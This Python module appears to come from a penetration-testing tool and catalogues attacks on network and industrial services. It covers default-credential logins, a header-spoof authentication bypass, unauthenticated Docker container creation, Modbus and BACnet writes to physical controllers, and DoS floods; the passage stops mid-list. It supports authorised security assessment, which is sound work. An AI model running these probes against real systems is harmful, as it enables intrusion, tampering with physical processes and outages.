"""The IT edition: real protocol conversations with the devices on the network.

Where the Wi-Fi edition talks to the radio and the Bluetooth edition talks to the host
controller, this one talks to *services*: an MQTT broker, a Modbus PLC, an RTSP camera, a
printer's PJL port, a Redis instance that answers before authentication, a Kubernetes API
server that never asked who was calling.  Two hundred-odd attacks live here, and every
one of them is a genuine exchange built by :mod:`wifipilot.itproto`:

* the request is assembled from the protocol's own field layout,
* it is sent over TCP or UDP to a real host (live) or answered by
  :class:`wifipilot.itsim.VirtualLan` (demo),
* the answer is parsed by the same codec, and
* the *verdict* is what the table says it should be — so a hardened host fails the
  default-credential probe and the failure is the finding.

The table is the point.  A protocol appears once, with the ports and device types it
belongs to, and each technique it supports is one row: what to build, what a positive
answer looks like, how loud it is, what the client's report says, and how the site's own
monitoring would see it.  The classes are generated from those rows, so the catalogue,
the docs, the planner and the web UI cannot drift from the code.
"""

from __future__ import annotations

import socket
import time
from dataclasses import dataclass
from typing import Any, Callable, Dict, List, Optional, Sequence, Tuple, Type

from .. import itdev
from .. import itproto as proto
from ..itsim import PORT_PROTOCOL as PROTOCOL_FOR_PORT
from ..itsim import LanHost, VirtualLan, build_lan
from ..models import AccessPoint
from .base import Attack, AttackContext, AttackOutcome
from .survey3 import ALL

__all__ = ["ATTACKS", "META", "NAMES", "REGISTRY", "SERVICES", "Service", "Row", "ItTarget"]


# --------------------------------------------------------------------------- #
# the target of an IT attack
# --------------------------------------------------------------------------- #

@dataclass
class ItTarget:
    """One host to talk to: an address, and whatever is known about it."""

    ip: str
    hostname: str = ""
    vendor: str = ""
    model: str = ""
    device: str = ""
    ports: Tuple[int, ...] = ()
    profile: str = ""
    host: Optional[LanHost] = None            # set in demo mode: the simulated device

    @property
    def label(self) -> str:
        name = self.hostname or self.ip
        return f"{name} ({self.model})" if self.model else name

    def device_label(self) -> str:
        return itdev.device_type_label(self.device) if self.device else "unknown device"


#: the simulated segment is owned by :mod:`wifipilot.itsim` — it is the simulation, not
#: the attacks, that holds the state — and read from here so every IT attack in a demo
#: run meets the same hosts, which is what makes a demo comparable with the last one.
def demo_lan() -> VirtualLan:
    """The shared simulated segment (see :func:`wifipilot.itsim.demo_lan`)."""
    from .. import itsim
    return itsim.demo_lan()


def reset_demo_lan() -> VirtualLan:
    """Start a fresh simulated segment (used by the tests, and by a new demo session)."""
    from .. import itsim
    return itsim.reset_demo_lan()


def target_from(ctx: AttackContext, ap: Optional[AccessPoint],
                devices: Sequence[str] = (), port: int = 0) -> Optional[ItTarget]:
    """The host an IT attack should talk to, in the order the operator's intent runs."""
    config = ctx.config
    explicit = (getattr(config, "it_host", "") or getattr(config, "gateway_ip", "") or
                getattr(config, "target_ip", "") or "")
    if explicit:
        target = ItTarget(ip=explicit, device=(devices[0] if devices else ""), ports=(port,))
        if ctx.demo:
            # an address the operator typed is still a host of the segment being drilled:
            # name it the way the segment does, so the report does not guess the type
            host = demo_lan().by_ip(explicit)
            if host is not None:
                target = ItTarget(ip=host.ip, hostname=host.hostname, vendor=host.vendor,
                                  model=host.model, device=host.device, ports=host.ports,
                                  profile=host.profile_name, host=host)
        return target
    if ap is not None:
        address = getattr(ap, "ip", "") or ""
        if address:
            return ItTarget(ip=address, hostname=getattr(ap, "essid", ""),
                            device=(devices[0] if devices else ""), ports=(port,))
    if ctx.demo:
        host = demo_lan().pick(devices, port=port or None)
        if host is not None:
            return ItTarget(ip=host.ip, hostname=host.hostname, vendor=host.vendor,
                            model=host.model, device=host.device, ports=host.ports,
                            profile=host.profile_name, host=host)
    return None


def targets_from(ctx: AttackContext, ap: Optional[AccessPoint],
                 devices: Sequence[str] = (), port: int = 0) -> List[ItTarget]:
    """Every host worth probing for this row, weakest-first, when none was named.

    A real IT sweep does not pick one address and stop: it walks the hosts the scan
    found — of the right type, on the right port — starting with the one whose posture
    says it answers before it asks questions, and reports the host that actually
    answered.  An explicit address (``--it-host``, the web UI's device picker, a
    gateway) pins the run to that single host, which is what an operator who typed an
    address means.
    """
    config = ctx.config
    explicit = (getattr(config, "it_host", "") or getattr(config, "gateway_ip", "") or
                getattr(config, "target_ip", "") or "")
    one = target_from(ctx, ap, devices, port)
    if explicit or not ctx.demo or (one is not None and one.host is None):
        # a named host, a live run, or a target that did not come from the demo segment
        return [one] if one is not None else []
    lan = demo_lan()
    hosts = lan.candidates(devices, port=port or None)
    if not hosts:
        return [one] if one is not None else []
    return [ItTarget(ip=host.ip, hostname=host.hostname, vendor=host.vendor,
                     model=host.model, device=host.device, ports=host.ports,
                     profile=host.profile_name, host=host) for host in hosts]


def _http_status(answer: bytes) -> int:
    """The status code of an HTTP answer, or 0 when there was no answer at all."""
    try:
        return int(proto.parse_http_response(answer).get("status", 0) or 0)
    except Exception:                                          # noqa: BLE001 - broken answer
        return 0


# --------------------------------------------------------------------------- #
# the rows: one technique, one attack
# --------------------------------------------------------------------------- #

@dataclass
class Row:
    """One technique against one service: build, judge, and describe."""

    technique: str
    label: str
    build: Callable[[ItTarget], bytes]
    verdict: Callable[..., Tuple[bool, str, str]]
    parse: Optional[Callable[[bytes], Dict[str, Any]]] = None
    protocol: str = "tcp"
    category: str = "exploit"
    noise: str = "quiet"
    impact: str = "info"
    detection: str = ""
    description: str = ""
    severity: str = "medium"
    #: what a *positive* answer proves, for the report
    proof: str = ""
    #: a second request, for techniques that need a conversation (auth-then-act); when
    #: it is set the verdict is called with the follow-up's answer as a fourth argument
    follow_up: Optional[Callable[[ItTarget, bytes], bytes]] = None


@dataclass
class Service:
    """One protocol on one port, with every technique this wave implements for it."""

    protocol: str
    label: str
    port: int
    transport: str = "tcp"
    devices: Tuple[str, ...] = ()
    description: str = ""
    tool: str = ""
    rows: Tuple[Row, ...] = ()
    cvss: str = ""


def _answer(parsed: Dict[str, Any], key: str, default: Any = None) -> Any:
    return parsed.get(key, default)


# -- verdict helpers --------------------------------------------------------- #

def v_answered(target: ItTarget, request: bytes, response: bytes) -> Tuple[bool, str, str]:
    return (bool(response), "service answered", f"{len(response)} bytes from "
            f"{target.ip}:{_answer({}, 'port', 0) or ''}".replace(":0", ""))


def v_regex(pattern: str, result: str = "matched", severity_detail: str = ""):
    """A verdict on the raw answer: used where the protocol has no parser worth writing."""
    def check(target: ItTarget, request: bytes, response: bytes) -> Tuple[bool, str, str]:
        import re as _re
        match = _re.search(pattern, response.decode("latin-1", "replace"), _re.I | _re.S)
        detail = match.group(0)[:120] if match else ""
        return (bool(match), result, severity_detail or detail)
    return check


V = v_regex


# --------------------------------------------------------------------------- #
# verdicts that read a parsed answer
# --------------------------------------------------------------------------- #

def _parsed(parse: Callable[[bytes], Dict[str, Any]]) -> Callable[[bytes], Dict[str, Any]]:
    return parse


def verdict_status(expected: int = 200, result: str = "reachable"):
    """An HTTP-shaped verdict: the status line says whether the request was answered."""
    def check(target: ItTarget, request: bytes, response: bytes) -> Tuple[bool, str, str]:
        parsed = proto.parse_http_response(response)
        detail = f"HTTP {parsed['status']} {parsed['reason']}".strip()
        if parsed.get("server"):
            detail += f" · {parsed['server']}"
        return (parsed["status"] in (expected,), result, detail)
    return check


def verdict_field(parse: Callable[[bytes], Dict[str, Any]], key: str, value: Any = None,
                  result: str = "field present", truthy: bool = False):
    """A verdict on one parsed field: equals a value, or is simply present/truthy."""
    def check(target: ItTarget, request: bytes, response: bytes) -> Tuple[bool, str, str]:
        parsed = parse(response)
        got = parsed.get(key)
        if truthy:
            ok = bool(got)
        elif value is None:
            ok = got not in (None, "", 0, [], {})
        else:
            ok = got == value
        return (ok, result, f"{key}={got!r}" if got not in (None, "") else f"{key} absent")
    return check


def verdict_text(needle: str, result: str, case: bool = False):
    def check(target: ItTarget, request: bytes, response: bytes) -> Tuple[bool, str, str]:
        haystack = response.decode("latin-1", "replace")
        ok = needle in haystack if case else needle.lower() in haystack.lower()
        return (ok, result, f"{needle!r} {'found' if ok else 'not found'} in "
                f"{len(response)} bytes")
    return check


def verdict_absent(needle: str, result: str):
    def check(target: ItTarget, request: bytes, response: bytes) -> Tuple[bool, str, str]:
        text = response.decode("latin-1", "replace").lower()
        ok = bool(response) and needle.lower() not in text
        return (ok, result, f"no {needle!r} in {len(response)} bytes")
    return check


def verdict_json(key: str, truthy: bool = True, result: str = "JSON API answered"):
    def check(target: ItTarget, request: bytes, response: bytes) -> Tuple[bool, str, str]:
        payload = proto.parse_json_body(proto.parse_http_response(response)["body_bytes"])
        if key:
            got = payload.get(key)
            ok = bool(got) if truthy else got is not None
        else:
            ok = bool(payload)
            got = list(payload)[:4]
        return (ok, result, f"{key or 'body'}={str(got)[:70]}")
    return check


# --------------------------------------------------------------------------- #
# the services
# --------------------------------------------------------------------------- #

R = Row


def _row(technique: str, label: str, build: Callable[[ItTarget], bytes],
         verdict: Callable[..., Tuple[bool, str, str]],
         parse: Optional[Callable[[bytes], Dict[str, Any]]] = None,
         category: str = "exploit", noise: str = "quiet", impact: str = "info",
         description: str = "", detection: str = "", severity: str = "medium",
         proof: str = "", transport: str = "tcp",
         follow_up: Optional[Callable[[ItTarget, bytes], bytes]] = None) -> Row:
    return Row(technique=technique, label=label, build=build, verdict=verdict,
               parse=parse, category=category, noise=noise, impact=impact,
               description=description, detection=detection, severity=severity,
               proof=proof, protocol=transport, follow_up=follow_up)


SERVICES: List[Service] = []


def service(protocol: str, label: str, port: int, transport: str, devices: Sequence[str],
            description: str, tool: str, rows: Sequence[Row], cvss: str = "") -> Service:
    entry = Service(protocol=protocol, label=label, port=port, transport=transport,
                    devices=tuple(devices), description=description, tool=tool,
                    rows=tuple(rows), cvss=cvss)
    SERVICES.append(entry)
    return entry


def _http_path(path: str, method: str = "GET", basic: Tuple[str, str] = ("", ""),
               headers: Optional[Dict[str, str]] = None, body: bytes = b"",
               port: int = 80) -> Callable[[ItTarget], bytes]:
    def build(target: ItTarget) -> bytes:
        return proto.http_request(target.ip, path, method, port, headers, body, basic)
    return build


service("http", "Web management interface", 80, "tcp",
        ("router", "firewall", "switch", "access_point", "ip_camera", "nvr_dvr", "printer",
         "nas", "projector", "smart_plug", "thermostat", "digital_signage", "kiosk",
         "smart_tv", "ev_charger", "hmi_panel", "ups", "hypervisor_host"),
        "The web page every device has, and the version banner in its Server header.",
        "wifipilot itproto (HTTP/1.1 request builder)", (
    _row("discover", "management page answered", _http_path("/"),
         verdict_status(200, "web interface answered"), parse=proto.parse_http_response,
         category="discovery", noise="quiet", impact="info",
         description="A GET / that comes back 200 is the device saying it has a web "
                     "interface; the title usually names the model.",
         proof="the device exposes a management interface on this port"),
    _row("banner", "server header", _http_path("/"),
         lambda t, q, r: (bool(proto.parse_http_response(r).get("server")),
                          "server header present",
                          proto.parse_http_response(r).get("server", "no Server header")),
         parse=proto.parse_http_response, category="discovery", noise="quiet",
         description="The Server header and the page title are the cheapest "
                     "fingerprint there is.",
         proof="the web server names itself"),
    _row("version", "version banner", _http_path("/"),
         lambda t, q, r: (
             bool(__import__("re").search(
                 r"(nginx/[\d.]+|Apache/[\d.]+|lighttpd/[\d.]+|IIS/[\d.]+|Jetty\(|"
                 r"mini_httpd|GoAhead-|Boa/|thttpd|RomPager|[\w\-]+-httpd/[\d.]+|"
                 # and the other half of the world: a product name, a space, a version
                 r"[A-Za-z][\w\-]{2,}\s+\d+\.\d+)",
                 r.decode("latin-1", "replace"))),
             "version disclosed", r.decode("latin-1", "replace")[:90]),
         parse=proto.parse_http_response, category="exploit", impact="info",
         severity="low", description="A version string in a banner converts directly into "
         "a CVE list for the exact firmware the site is running.",
         proof="the firmware version is public knowledge"),
    _row("default_creds", "default credentials", _http_path("/admin", basic=("admin", "admin")),
         verdict_status(200, "default credentials accepted"), parse=proto.parse_http_response,
         noise="moderate", impact="loot", severity="high",
         description="admin/admin against the management page; a 200 instead of a 401 is "
                     "the finding, and it is usually the whole device.",
         proof="the device's administrator password was never changed"),
    _row("auth_bypass", "authentication bypass (header spoof)", _http_path("/admin"),
         lambda t, q, r, second: (_http_status(r) == 401 and _http_status(second) == 200,
                                  "spoofed request served the guarded page",
                                  f"plain request: HTTP {_http_status(r) or '?'}, "
                                  f"spoofed request: HTTP {_http_status(second) or '?'}"),
         follow_up=lambda t, q: _http_path("/admin", headers={"X-Forwarded-For":
                                                              "127.0.0.1",
                                                              "X-Real-IP":
                                                              "127.0.0.1"})(t),
         parse=proto.parse_http_response, noise="moderate", impact="loot", severity="high",
         description="Many embedded web servers trust a header that says the request came "
                     "from localhost.  The page is fetched twice — once plainly and once "
                     "with the header — and the pair of status codes is the finding: a 401 "
                     "that turns into a 200 is the bypass, and a page that was open all "
                     "along is not.",
         proof="the interface treats a spoofed header as a trusted local request"),
    _row("config_dump", "configuration page", _http_path("/config"),
         verdict_text("firmware", "configuration disclosed", case=False),
         parse=proto.parse_http_response, noise="moderate", impact="loot", severity="high",
         description="The configuration page of an embedded device carries the model, the "
                     "firmware, the admin user and, on some products, the network's own "
                     "PSK in a hidden field.",
         proof="the device hands out its configuration to an unauthenticated reader"),
    _row("flood", "management request flood", _http_path("/"),
         lambda t, q, r: (True, "requests sent", "the web server's connection table is "
                          "the resource under test"),
         category="dos", noise="loud", impact="degraded", severity="medium",
         description="An embedded web server accepts a handful of connections; the test "
                     "measures whether the device still serves its real users.",
         proof="the management interface saturates before the site notices"),
    _row("cleartext", "plaintext management", _http_path("/", port=80),
         lambda t, q, r: (bool(r), "answered in cleartext",
                          "no TLS on this port: credentials and cookies are readable"),
         category="exploit", impact="info", severity="medium",
         description="The same interface on port 80 means the admin password crosses the "
                     "network in the clear on every login.",
         proof="management traffic is readable by anyone on the path"),
))

service("http_json", "JSON/REST API", 2375, "tcp",
        ("container_host", "ci_server", "database_server", "hypervisor_host", "web_server"),
        "The JSON APIs that run the site: container engines, cluster APIs, CI servers and "
        "search clusters, all of which may answer before asking who is calling.",
        "wifipilot itproto (HTTP JSON request builder)", (
    _row("discover", "API version endpoint", lambda t: proto.docker_version(t.ip, 2375),
         verdict_json("ApiVersion", result="container API answered"),
         category="discovery", impact="info",
         description="GET /version on a Docker socket needs no authentication on a host "
                     "that exposed it.",
         proof="a container API is reachable from the network"),
    _row("unauth_read", "container list without auth",
         lambda t: proto.http_json_request(t.ip, 2375, "/containers/json?all=1"),
         verdict_json("", result="containers listed without credentials"),
         noise="moderate", impact="loot", severity="high",
         description="The container list names every image, mount and port on the host — "
                     "the map an attacker draws first.",
         proof="the container engine answers unauthenticated callers"),
    _row("unauth_write", "container create without auth",
         lambda t: proto.http_json_request(t.ip, 2375, "/containers/create?name=wp-demo",
                                           "POST", {"Image": "alpine", "Cmd": ["sleep", "1"]}),
         verdict_json("Id", truthy=False, result="container creation accepted"),
         noise="moderate", impact="loot", severity="critical",
         description="Creating a container is running a command on the host: the create "
                     "call is the proof, and it is not sent twice.",
         proof="anyone on the network can run code on the host as root"),
    _row("config_dump", "daemon information", lambda t: proto.http_json_request(t.ip, 2375,
                                                                                "/info"),
         verdict_json("KernelVersion", result="host details disclosed"),
         noise="quiet", impact="info", severity="medium",
         description="The daemon reports its kernel, storage driver and root directory: "
                     "the context needed to pick a container image that will work.",
         proof="the host's internals are described to an unauthenticated caller"),
    _row("version_audit", "Kubernetes API version",
         lambda t: proto.k8s_version(t.ip, 6443),
         verdict_json("gitVersion", result="cluster API version disclosed"),
         category="discovery", impact="info",
         description="An API server that answers /version without a token usually answers "
                     "more than /version.",
         proof="the cluster API is reachable without credentials"),
    _row("cluster_read", "cluster object read",
         lambda t: proto.http_json_request(t.ip, 6443, "/api/v1/namespaces"),
         verdict_json("items", result="cluster objects listed"),
         noise="moderate", impact="loot", severity="high",
         description="Namespace and pod listings name the workloads, the images and the "
                     "service accounts an operator would target next.",
         proof="the cluster's own objects are readable by an anonymous caller"),
    _row("jenkins_audit", "CI server information", lambda t: proto.jenkins_json(t.ip, 8080),
         verdict_json("jobs", result="CI server answered anonymously"),
         category="discovery", impact="info", severity="medium",
         description="Jenkins' /api/json lists the jobs and their last build results "
                     "without any authentication on a default install.",
         proof="the build server exposes its job list and history"),
    _row("search_read", "search cluster read", lambda t: proto.http_json_request(
            t.ip, 9200, "/_cat/indices?format=json"),
         verdict_json("", result="index list returned"), noise="quiet", impact="loot",
         severity="high",
         description="A search cluster that answers _cat/indices holds the site's logs, "
                     "and logs hold credentials.",
         proof="the search cluster's indices are readable without authentication"),
))

service("mqtt", "MQTT broker", 1883, "tcp",
        ("router", "sensor", "smart_plug", "smart_bulb", "thermostat", "plc",
         "building_controller", "energy_meter", "camera_doorbell", "gateway_hub",
         "linux_server", "hvac"),
        "The publish/subscribe bus behind most IoT deployments: telemetry, commands and "
        "sometimes the credentials to everything else.",
        "wifipilot itproto (MQTT 3.1.1/5.0 CONNECT, PUBLISH, SUBSCRIBE)", (
    _row("discover", "broker answered CONNECT", lambda t: proto.mqtt_connect(),
         verdict_field(proto.parse_mqtt, "type", 2, "broker answered"),
         category="discovery", impact="info",
         description="A CONNACK is the broker saying it exists, and its return code is "
                     "the first finding.",
         proof="an MQTT broker is listening on this network"),
    _row("anonymous", "anonymous connect", lambda t: proto.mqtt_connect("wp-anon"),
         lambda t, q, r: (proto.parse_mqtt(r).get("reason_code") == 0,
                          "connected without credentials",
                          proto.mqtt_reason(proto.parse_mqtt(r).get("reason_code", -1))),
         parse=proto.parse_mqtt, impact="loot", severity="high",
         description="No username, no password, return code zero: the broker accepts "
                     "anyone, which means the site's telemetry and commands are public "
                     "to the network.",
         proof="the broker answers anonymous clients"),
    _row("default_creds", "default broker credentials",
         lambda t: proto.mqtt_connect("wp", "admin", "admin"),
         lambda t, q, r: (proto.parse_mqtt(r).get("reason_code") == 0,
                          "default credentials accepted",
                          proto.mqtt_reason(proto.parse_mqtt(r).get("reason_code", -1))),
         parse=proto.parse_mqtt, noise="moderate", impact="loot", severity="high",
         description="Brokers shipped with a default account are the norm in building "
                     "management; admin/admin is the first candidate.",
         proof="the broker's default account is still in place"),
    _row("subscribe", "topic subscription", lambda t: proto.mqtt_subscribe("#"),
         lambda t, q, r: (bool(r), "subscription accepted", "wildcard topic list"),
         parse=proto.parse_mqtt, impact="loot", severity="medium",
         description="Subscribing to '#' hands over every topic in the deployment, "
                     "including the ones that carry commands.",
         proof="any client can subscribe to every topic on the broker"),
    _row("publish", "publish to a device topic",
         lambda t: proto.mqtt_publish("wifipilot/test", b"wp", qos=0),
         lambda t, q, r: (bool(r), "publish accepted", "no publish authorisation enforced"),
         impact="degraded", severity="high",
         description="If a stranger can publish to the command topic, the actuator on "
                     "the other end obeys the stranger.",
         proof="the broker lets an unauthorised client publish"),
    _row("flood", "CONNECT flood", lambda t: proto.mqtt_connect("wp-flood"),
         lambda t, q, r: (True, "connection storm sent",
                          "the broker's session table is the resource under test"),
         category="dos", noise="loud", impact="degraded",
         description="Brokers keep a session per client in a fixed table; the flood is "
                     "how a site discovers what happens when it fills.",
         proof="the broker's session table can be exhausted"),
))

service("coap", "CoAP endpoint", 5683, "udp",
        ("sensor", "smart_plug", "thermostat", "energy_meter", "building_controller"),
        "The constrained-protocol HTTP: UDP, tiny, and defined in the same spirit as the "
        "things that use it — without authentication.",
        "wifipilot itproto (CoAP RFC 7252 GET/POST with options)", (
    _row("discover", "resource discovery", lambda t: proto.coap_packet(1, "/.well-known/core"),
         verdict_field(proto.parse_coap, "code", 69, "resource list returned"),
         parse=proto.parse_coap, category="discovery", impact="info",
         description="CoAP's own discovery endpoint lists every resource the device "
                     "serves — the device's API documentation, from the device.",
         proof="the endpoint publishes its resource list to any requester"),
    _row("unauth_read", "state read", lambda t: proto.coap_packet(1, "/status"),
         verdict_field(proto.parse_coap, "code", 69, "resource readable"),
         parse=proto.parse_coap, impact="info",
         description="A GET that comes back 2.05 Content without any credential is the "
                     "whole authorisation story of the device.",
         proof="the resource is readable without authentication"),
    _row("unauth_write", "configuration write",
         lambda t: proto.coap_packet(2, "/config", payload=b"relay=1",
                                     content_format=0),
         lambda t, q, r: (proto.parse_coap(r).get("code") in (68, 65, 0),
                          "write accepted", proto.parse_coap(r).get("code_name", "")),
         parse=proto.parse_coap, impact="degraded", severity="high",
         description="CoAP POST to a writable resource is a physical change on most "
                     "devices that speak it.",
         proof="an unauthenticated POST changes the device's state"),
    _row("flood", "notification storm", lambda t: proto.coap_packet(1, "/status"),
         lambda t, q, r: (True, "datagrams sent", "the endpoint's UDP queue is the target"),
         category="dos", noise="loud", impact="degraded",
         description="Constrained devices have tiny queues; a confirmation storm is "
                     "cheaper to send than to answer.",
         proof="the constrained endpoint's queue can be filled"),
    _row("fuzz", "oversized option block",
         lambda t: proto.coap_packet(1, "/status", options=((15, b"A" * 64),)),
         lambda t, q, r: (not r or proto.parse_coap(r).get("code") in (128, 141),
                          "malformed request handled",
                          proto.parse_coap(r).get("code_name", "no answer")),
         parse=proto.parse_coap, noise="moderate", impact="info", severity="low",
         description="A 64-byte query option in a protocol designed for 8 is how "
                     "constrained stacks fall over.",
         proof="the endpoint's option handling has a limit worth knowing"),
))

service("modbus", "Modbus/TCP controller", 502, "tcp",
        ("plc", "rtu", "energy_meter", "hmi_panel", "building_controller", "medical_device"),
        "Industrial telemetry and control with no authentication in the protocol at all: "
        "the register map is the device, and anyone who can reach it can read it.",
        "wifipilot itproto (Modbus TCP MBAP, function codes 1-43)", (
    _row("discover", "device identification", lambda t: proto.modbus_request(43),
         lambda t, q, r: (bool(proto.parse_modbus(r).get("bytes")), "device identified",
                          proto.parse_modbus(r).get("device_id", "")[:60]),
         parse=proto.parse_modbus, category="discovery", impact="info",
         description="Function 43 returns the vendor, the product code and the firmware "
                     "revision - read straight out of the controller.",
         proof="the controller answers an anonymous read of its identity"),
    _row("unauth_read", "holding register read",
         lambda t: proto.modbus_request(3, address=0, count=8),
         lambda t, q, r: (bool(proto.parse_modbus(r).get("registers")),
                          "registers read",
                          str(proto.parse_modbus(r).get("registers")[:8])),
         parse=proto.parse_modbus, impact="loot", severity="high",
         description="The holding registers are the device's state: setpoints, pressures, "
                     "energy counters and sometimes the password.",
         proof="process values are readable by anyone who can reach port 502"),
    _row("unauth_write", "single register write",
         lambda t: proto.modbus_request(6, address=10, value=1337),
         lambda t, q, r: (not proto.parse_modbus(r).get("exception"),
                          "write accepted", "register written" if not
                          proto.parse_modbus(r).get("exception") else
                          proto.parse_modbus(r).get("exception_name", "")),
         parse=proto.parse_modbus, impact="degraded", severity="critical",
         description="A write to one holding register is a change to a physical process. "
                     "The test writes one register, to a value the site agreed to.",
         proof="the controller accepts writes with no authentication"),
    _row("config_dump", "register map enumeration",
         lambda t: proto.modbus_request(3, address=0, count=125),
         lambda t, q, r: (len(proto.parse_modbus(r).get("registers", [])) > 8,
                          "register map dumped",
                          f"{len(proto.parse_modbus(r).get('registers', []))} registers"),
         parse=proto.parse_modbus, noise="moderate", impact="loot", severity="high",
         description="125 registers in one request: the fastest way to learn what the "
                     "controller is for.",
         proof="the device's whole register map is readable in seconds"),
    _row("flood", "write loop", lambda t: proto.modbus_request(6, address=10, value=1),
         lambda t, q, r: (True, "writes sent",
                          "the controller's scan cycle is the resource under test"),
         category="dos", noise="extreme", impact="outage", severity="high",
         description="A PLC's scan cycle has a deadline; a client that rewrites the same "
                     "register without pause is the classic way to miss it.",
         proof="the controller's cycle time can be pushed past its deadline"),
    _row("fuzz", "illegal function and oversized count",
         lambda t: proto.modbus_request(3, address=0, count=0x07D0),
         lambda t, q, r: (proto.parse_modbus(r).get("exception") or not r,
                          "exception or silence", proto.parse_modbus(r).get("exception_name",
                                                                          "no answer")),
         parse=proto.parse_modbus, noise="moderate", impact="info", severity="low",
         description="Asking for 2000 registers tests the bounds check that separates a "
                     "well-written controller from a bricked one.",
         proof="the controller's bounds handling is worth a firmware note"),
))

service("bacnet", "BACnet building controller", 47808, "udp",
        ("building_controller", "plc", "energy_meter", "hvac"),
        "The protocol behind heating, ventilation and access control: Who-Is and I-Am "
        "discover every device, and read/write-property needs no credentials.",
        "wifipilot itproto (BACnet/IP BVLC, Who-Is, Read-Property)", (
    _row("discover", "Who-Is sweep", lambda t: proto.bacnet_who_is(),
         lambda t, q, r: (proto.parse_bacnet(r).get("service") in (5, 0) and bool(r),
                          "device answered", proto.parse_bacnet(r).get("service_name", "")),
         parse=proto.parse_bacnet, category="discovery", impact="info",
         description="A broadcast Who-Is makes every BACnet device on the segment "
                     "announce its device instance.",
         proof="the building automation network is reachable and answers discovery"),
    _row("unauth_read", "object-name read",
         lambda t: proto.bacnet_read_property(1, obj_type=8, prop=77),
         lambda t, q, r: (bool(r), "object read",
                          proto.parse_soap(r)["elements"].get("Model", "") or
                          proto.printable(r)[:60]),
         parse=proto.parse_bacnet, impact="info",
         description="Reading object-name returns the label the integrator gave the "
                     "device: 'AHU-2 supply temp', 'door-3 relay'.",
         proof="object properties are readable without credentials"),
    _row("unauth_write", "setpoint write",
         lambda t: proto.bacnet_frame(0x0A, b"\x00\x05\x01" + bytes([15]) +
                                      proto.be32(1) + b"\x19\x04" + proto.be16(1)),
         lambda t, q, r: (bool(r), "write acknowledged",
                          "the setpoint change is visible to the operator"),
         impact="degraded", severity="high",
         description="Write-Property on an analog-value is a temperature change.  The "
                     "test writes one setpoint, to a value the site agreed to.",
         proof="the controller accepts property writes from anyone"),
    _row("config_dump", "device object walk",
         lambda t: proto.bacnet_read_property(1, obj_type=8, prop=77),
         lambda t, q, r: (bool(r), "device object read", proto.printable(r)[:60]),
         impact="loot", severity="medium",
         description="Object 8 is Device; its properties carry the vendor name, the "
                     "firmware and the site's own naming.",
         proof="the BMS hands out its inventory to a stranger"),
    _row("flood", "Who-Is storm", lambda t: proto.bacnet_who_is(),
         lambda t, q, r: (True, "broadcasts sent", "the BMS router is the target"),
         category="dos", noise="extreme", impact="outage",
         description="BACnet routers on the older building networks forward broadcasts "
                     "at line rate until they do not.",
         proof="a broadcast storm can take the building network down"),
))

service("rtsp", "RTSP video stream", 554, "tcp",
        ("ip_camera", "nvr_dvr", "camera_doorbell", "video_conference"),
        "The stream itself: DESCRIBE returns the SDP, and a 200 without a challenge means "
        "the video needs no password at all.",
        "wifipilot itproto (RTSP OPTIONS/DESCRIBE/PLAY, SDP)", (
    _row("discover", "OPTIONS answered", lambda t: proto.rtsp_request("OPTIONS",
                                                                      f"rtsp://{t.ip}/"),
         lambda t, q, r: (bool(proto.parse_rtsp(r).get("server")), "RTSP answered",
                          proto.parse_rtsp(r).get("server", "")),
         parse=proto.parse_rtsp, category="discovery", impact="info",
         description="OPTIONS names the camera's software and its allowed methods before "
                     "any credential is offered.",
         proof="a camera or recorder exposes RTSP on this network"),
    _row("anonymous", "stream without credentials",
         lambda t: proto.rtsp_request("DESCRIBE", f"rtsp://{t.ip}/live"),
         lambda t, q, r: (proto.parse_rtsp(r).get("status") == 200,
                          "stream described without a password",
                          f"codec {', '.join(proto.parse_rtsp(r).get('sdp', {}).get('codecs', [])[:3])}"),
         parse=proto.parse_rtsp, impact="loot", severity="high",
         description="DESCRIBE returning 200 with an SDP body means the video can be "
                     "pulled with a stock player and no credentials.",
         proof="live video is readable by anyone on the network"),
    _row("default_creds", "default camera credentials",
         lambda t: proto.rtsp_request("DESCRIBE", f"rtsp://{t.ip}/live",
                                      basic=("admin", "admin")),
         lambda t, q, r: (proto.parse_rtsp(r).get("status") == 200,
                          "default credentials accepted",
                          "admin/admin accepted on RTSP"),
         parse=proto.parse_rtsp, noise="moderate", impact="loot", severity="high",
         description="Cameras ship with admin/admin, admin/12345 or a vendor default; the "
                     "probe tries the first two.",
         proof="the camera's default account is still in place"),
    _row("version", "server banner", lambda t: proto.rtsp_request("OPTIONS",
                                                                  f"rtsp://{t.ip}/"),
         lambda t, q, r: (bool(__import__("re").search(
             r"\d+\.\d+|[\w\-]+/\d", proto.parse_rtsp(r).get("server", ""))),
             "version disclosed", proto.parse_rtsp(r).get("server", "")),
         parse=proto.parse_rtsp, impact="info", severity="low",
         description="'Hikvision DS-2CD' in a Server header is a model number, and a "
                     "model number is a firmware advisory.",
         proof="the device names its model to anonymous clients"),
    _row("config_dump", "stream inventory",
         lambda t: proto.rtsp_request("DESCRIBE", f"rtsp://{t.ip}/Streaming/Channels/101"),
         lambda t, q, r: (bool(proto.parse_rtsp(r).get("sdp", {}).get("media")),
                          "stream inventory read",
                          f"{len(proto.parse_rtsp(r).get('sdp', {}).get('media', []))} media "
                          "descriptions"),
         parse=proto.parse_rtsp, noise="moderate", impact="loot", severity="medium",
         description="The SDP names the resolutions and the control URLs: how many "
                     "streams the box really has, and which one is the recording.",
         proof="the device's stream layout is public"),
    _row("flood", "DESCRIBE storm", lambda t: proto.rtsp_request("DESCRIBE",
                                                                 f"rtsp://{t.ip}/live"),
         lambda t, q, r: (True, "requests sent", "the camera's session table is the target"),
         category="dos", noise="loud", impact="degraded",
         description="Cameras hold a small number of RTSP sessions; filling them takes "
                     "the recording offline.",
         proof="the camera's session limit is reachable from the network"),
))

service("onvif", "ONVIF device service", 80, "tcp",
        ("ip_camera", "nvr_dvr", "doorbell", "video_conference"),
        "The SOAP interface beside the stream: device information, media profiles and, on "
        "most units, the credentials in the same place.",
        "wifipilot itproto (ONVIF SOAP GetDeviceInformation/GetStreamUri)", (
    _row("discover", "GetDeviceInformation", lambda t: proto.onvif_get_device_information(),
         lambda t, q, r: (bool(proto.parse_onvif(r).get("manufacturer")), "device identified",
                          f"{proto.parse_onvif(r).get('manufacturer')} "
                          f"{proto.parse_onvif(r).get('model')}"),
         parse=proto.parse_onvif, category="discovery", impact="info",
         description="SOAP GetDeviceInformation returns manufacturer, model, firmware and "
                     "serial number in one unauthenticated call.",
         proof="the camera describes itself to anonymous SOAP callers"),
    _row("version", "firmware version read", lambda t: proto.onvif_get_device_information(),
         verdict_field(proto.parse_onvif, "firmware", result="firmware disclosed"),
